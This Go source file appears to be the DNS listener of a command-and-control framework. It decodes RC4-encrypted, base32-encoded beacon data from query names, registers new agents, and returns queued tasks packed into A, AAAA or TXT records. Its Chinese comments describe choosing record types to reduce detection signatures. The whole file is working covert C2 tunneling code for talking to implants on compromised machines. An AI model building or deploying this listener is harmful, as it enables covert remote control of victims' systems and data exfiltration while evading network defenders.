package main

import (
	"context"
	"encoding/base32"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"

	"crypto/rc4"

	dns "github.com/miekg/dns"
)

// dnsDebug controls verbose logging for the DNS listener. It is disabled by
// default so that release builds remain quiet. Set to true temporarily when
// troubleshooting BeaconDNS behavior.
const dnsDebug = false

type DNS struct {
	Config DNSConfig
	Name   string
	Active bool

	server *dns.Server
	ts     Teamserver
}

func (d *DNS) Start(ts Teamserver) error {
	if d.Config.TTL <= 0 {
		d.Config.TTL = 10
	}
	if d.Config.QType == "" {
		d.Config.QType = "TXT"
	}
	if d.Config.PktSize <= 0 || d.Config.PktSize > 64000 {
		d.Config.PktSize = 1024
	}

	addr := net.JoinHostPort(d.Config.HostBind, strconv.Itoa(d.Config.PortBind))

	mux := dns.NewServeMux()
	mux.HandleFunc(".", d.handleDNS)

	d.server = &dns.Server{Addr: addr, Net: "udp", Handler: mux}
	d.ts = ts

	go func() {
		if err := d.server.ListenAndServe(); err != nil {
			if dnsDebug {
				fmt.Printf("[BeaconDNS] listener error: %v\n", err)
			}
		}
	}()

	time.Sleep(200 * time.Millisecond)
	d.Active = true
	return nil
}

func (d *DNS) Stop() error {
	d.Active = false
	if d.server == nil {
		return nil
	}
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()
	return d.server.ShutdownContext(ctx)
}

// 协议约定（简化版）：
// qname = <sid>.<op>.<seq>.<idx>.<data>.<...>.domain
// 其中 data = base32(no padding, upper) 的 RC4(payload)
// sid 建议为 8 字节 ID 的 16 位 hex 字符串，op = HI/PUT/GET
func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true

	ttl := uint32(d.Config.TTL)
	qtype := strings.ToUpper(d.Config.QType)

	for _, q := range r.Question {
		labels := dns.SplitDomainName(q.Name)
		base := labels

		if d.Config.Domain != "" {
			dom := strings.TrimSuffix(strings.ToLower(d.Config.Domain), ".")
			for i := range labels {
				tail := strings.ToLower(strings.Join(labels[i:], "."))
				if tail == dom {
					base = labels[:i]
					break
				}
			}
		}

		var sid, op string
		var seq, idx int
		var dataB []byte

		if len(base) >= 5 {
			sid = base[0]
			op = strings.ToUpper(base[1])
			seq, _ = strconv.Atoi(base[2])
			idx, _ = strconv.Atoi(base[3])

			_ = seq
			_ = idx

			dataLabel := strings.Join(base[4:], "")
			enc := base32.StdEncoding.WithPadding(base32.NoPadding)
			dataLabel = strings.ToUpper(dataLabel)
			if db, err := enc.DecodeString(dataLabel); err == nil {
				dataB = db
			}
		}

		if dnsDebug {
			remote := ""
			if addr, ok := w.RemoteAddr().(*net.UDPAddr); ok {
				remote = addr.IP.String()
			}
			fmt.Printf("[BeaconDNS] q from %s name=%s qtype=%d op=%s sid=%s seq=%d idx=%d len=%d\n",
				remote, q.Name, q.Qtype, op, sid, seq, idx, len(dataB))
		}

		switch op {
		case "HI", "PUT":
			if len(dataB) > 0 {
				if op == "HI" {
					// HI：尝试解出 beat 头，创建 Agent
					keyBytes, _ := hex.DecodeString(d.Config.EncryptKey)
					if len(keyBytes) == 16 && len(dataB) >= 8 {
						if c, e := rc4.NewCipher(keyBytes); e == nil {
							beat := make([]byte, len(dataB))
							c.XORKeyStream(beat, dataB)
							if len(beat) >= 8 {
								agentType := fmt.Sprintf("%08x", binary.BigEndian.Uint32(beat[:4]))
								agentId := fmt.Sprintf("%08x", binary.BigEndian.Uint32(beat[4:8]))
								if !d.ts.TsAgentIsExists(agentId) {
									externalIP := ""
									if addr, ok := w.RemoteAddr().(*net.UDPAddr); ok {
										externalIP = addr.IP.String()
									}
									if dnsDebug {
										fmt.Printf("[BeaconDNS] HI create agent type=%s id=%s ip=%s\n", agentType, agentId, externalIP)
									}
									_, _ = d.ts.TsAgentCreate(agentType, agentId, beat, d.Name, externalIP, true)
								}
								_ = d.ts.TsAgentSetTick(agentId)
							}
						}
					}
				}
				// 将payload交给 TS，sid 作为逻辑会话 ID（要求 Beacon 端保持一致）
				if dnsDebug {
					fmt.Printf("[BeaconDNS] %s payload len=%d sid=%s\n", op, len(dataB), sid)
				}
				_ = d.ts.TsAgentProcessData(sid, dataB)
			}
			// ACK：返回一个最小响应（不同 QType 返回不同 RR，以降低特征）
			if qtype == "A" {
				rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("127.0.0.1").To4()}
				m.Answer = append(m.Answer, rr)
			} else if qtype == "AAAA" {
				rr := &dns.AAAA{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl}, AAAA: net.ParseIP("::1").To16()}
				m.Answer = append(m.Answer, rr)
			} else {
				rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{"OK"}}
				m.Answer = append(m.Answer, rr)
			}

		case "GET":
			// 下行：从 TS 中取数据并映射到 A/AAAA/TXT RR
			var payload []byte
			if sid != "" {
				if p, err := d.ts.TsAgentGetHostedTasks(sid, d.Config.PktSize); err == nil {
					payload = p
					if dnsDebug {
						fmt.Printf("[BeaconDNS] GET tasks sid=%s pkt=%d\n", sid, len(payload))
					}
				}
			}

			if len(payload) == 0 {
				// 空响应
				if qtype == "A" {
					rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.0").To4()}
					m.Answer = append(m.Answer, rr)
				} else if qtype == "AAAA" {
					rr := &dns.AAAA{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl}, AAAA: net.ParseIP("::").To16()}
					m.Answer = append(m.Answer, rr)
				} else {
					rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{""}}
					m.Answer = append(m.Answer, rr)
				}
			} else {
				if qtype == "A" {
					start := 0
					maxBytes := d.Config.PktSize
					if maxBytes%4 != 0 {
						maxBytes = maxBytes - (maxBytes % 4)
					}
					if maxBytes <= 0 {
						maxBytes = 4
					}
					endLimit := start + maxBytes
					if endLimit > len(payload) {
						endLimit = len(payload)
					}
					for start < endLimit {
						end := start + 4
						if end > endLimit {
							end = endLimit
						}
						chunk := make([]byte, 4)
						copy(chunk, payload[start:end])
						ip := net.IPv4(chunk[0], chunk[1], chunk[2], chunk[3])
						rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: ip}
						m.Answer = append(m.Answer, rr)
						start = end
					}
				} else if qtype == "AAAA" {
					start := 0
					maxBytes := d.Config.PktSize
					if maxBytes%16 != 0 {
						maxBytes = maxBytes - (maxBytes % 16)
					}
					if maxBytes <= 0 {
						maxBytes = 16
					}
					endLimit := start + maxBytes
					if endLimit > len(payload) {
						endLimit = len(payload)
					}
					for start < endLimit {
						end := start + 16
						if end > endLimit {
							end = endLimit
						}
						chunk := make([]byte, 16)
						copy(chunk, payload[start:end])
						ip := net.IP(chunk)
						rr := &dns.AAAA{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl}, AAAA: ip}
						m.Answer = append(m.Answer, rr)
						start = end
					}
				} else {
					// TXT: 上下行数据用 RC4/pack 处理好了，这里直接返回原始 payload 切片即可
					start := 0
					for start < len(payload) {
						end := start + d.Config.PktSize
						if end > len(payload) {
							end = len(payload)
						}
						chunk := payload[start:end]
						// 为了简单，直接按 raw bytes 转 string；真正隐蔽性由上层编码控制
						rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{string(chunk)}}
						m.Answer = append(m.Answer, rr)
						start = end
					}
				}
			}

		default:
			// 未知 op：简单 keep-alive
			rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{"OK"}}
			m.Answer = append(m.Answer, rr)
		}
	}

	_ = w.WriteMsg(m)
}
